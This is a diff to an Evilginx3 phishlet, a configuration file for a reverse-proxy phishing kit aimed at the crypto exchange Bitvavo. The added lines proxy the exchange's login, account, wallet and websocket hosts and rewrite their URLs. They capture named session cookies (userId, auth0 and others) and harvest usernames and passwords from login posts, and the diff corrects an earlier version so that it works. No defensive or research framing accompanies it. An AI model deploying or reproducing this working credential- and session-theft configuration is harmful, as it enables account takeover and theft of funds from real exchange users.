@@ -1,41 +1,30 @@
 author: 'SimplerHacking'
 min_ver: '3.2.0'
-name: 'Evilginx3 Example Phishlet Updated 2'
+name: 'bitvavo-fixed'
 
 proxy_hosts:
+  - {phish_sub: 'ws-secondary', orig_sub: 'ws-secondary.eu-central-1', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ws-primary', orig_sub: 'ws-primary.eu-central-1', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'frontend', orig_sub: 'frontend-strapi-app', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'networks', orig_sub: 'networks', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bitvavo.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'wallets', orig_sub: 'wallets', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
 
-- {phish_sub: 'ws-secondary.eu-central-1', orig_sub: 'ws-secondary.eu-central-1', domain: 'Bitvavo.com', session: true, is_landing: false, auto_filter: true}
-
-- {phish_sub: 'ws-primary.eu-central-1', orig_sub: 'ws-primary.eu-central-1', domain: 'Bitvavo.com', session: true, is_landing: false, auto_filter: true}
-
-- {phish_sub: 'account', orig_sub: 'account', domain: 'Bitvavo.com', session: true, is_landing: false, auto_filter: true}
-
-- {phish_sub: 'frontend-strapi-app', orig_sub: 'frontend-strapi-app.', domain: 'Bitvavo.com', session: true, is_landing: false, auto_filter: true}
-
-- {phish_sub: 'networks', orig_sub: 'networks', domain: 'Bitvavo.com', session: true, is_landing: false, auto_filter: true}
-
-- {phish_sub: 'www', orig_sub: 'www', domain: 'Bitvavo.com', session: true, is_landing: true, auto_filter: true}
-
-- {phish_sub: 'assets', orig_sub: 'assets', domain: 'Bitvavo.com', session: true, is_landing: false, auto_filter: true}
-
-- {phish_sub: 'wallets', orig_sub: 'wallets', domain: 'Bitvavo.com', session: true, is_landing: false, auto_filter: true}
-
-- {phish_sub: 'login', orig_sub: 'login', domain: 'Bitvavo.com', session: true, is_landing: false, auto_filter: true}
 sub_filters:
-- {triggers_on: 'ws-secondary.eu-central-1', orig_sub: 'ws-secondary.eu-central-1', domain: 'Bitvavo.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*',>
-- {triggers_on: 'ws-primary.eu-central-1', orig_sub: 'ws-primary.eu-central-1', domain: 'Bitvavo.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'fo>
-- {triggers_on: 'account', orig_sub: 'account', domain: 'Bitvavo.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
-- {triggers_on: 'frontend-strapi-app.', orig_sub: 'frontend-strapi-app.', domain: 'Bitvavo.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*']}
-- {triggers_on: 'networks', orig_sub: 'networks', domain: 'Bitvavo.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
-- {triggers_on: 'www', orig_sub: 'www', domain: 'Bitvavo.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
-- {triggers_on: 'assets', orig_sub: 'assets', domain: 'Bitvavo.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
-- {triggers_on: 'login', orig_sub: 'login', domain: 'Bitvavo.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
+  - {triggers_on: 'www', orig_sub: 'www', domain: 'bitvavo.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'login', orig_sub: 'login', domain: 'bitvavo.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'account', orig_sub: 'account', domain: 'bitvavo.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'ws-primary', orig_sub: 'ws-primary.eu-central-1', domain: 'bitvavo.com', search: 'wss://{hostname_regexp}', replace: 'wss://{hostname}', mimes: ['application/javascript']}
+  - {triggers_on: 'ws-secondary', orig_sub: 'ws-secondary.eu-central-1', domain: 'bitvavo.com', search: 'wss://{hostname_regexp}', replace: 'wss://{hostname}', mimes: ['application/javascript']}
 
 auth_tokens:
-  - domain: '.Bitvavo.com'
-    keys: ['.*,regexp']
-    type: 'cookie'
- 
+  - domain: '.bitvavo.com'
+    keys: ['userId', 'auth_compat', 'auth0', 'AfuserId']
+    type: cookie
+
 auth_urls:
   - '/dashboard'
 
@@ -43,16 +32,12 @@ credentials:
   username:
     key: 'username'
     search: '(.*)'
-    type: 'post'
+    type: post
   password:
     key: 'password'
     search: '(.*)'
-    type: 'post'
+    type: post
 
 login:
-  domain: 'login.bitvavo.com'
+  domain: 'bitvavo.com'
   path: '/'
-
-
-
-
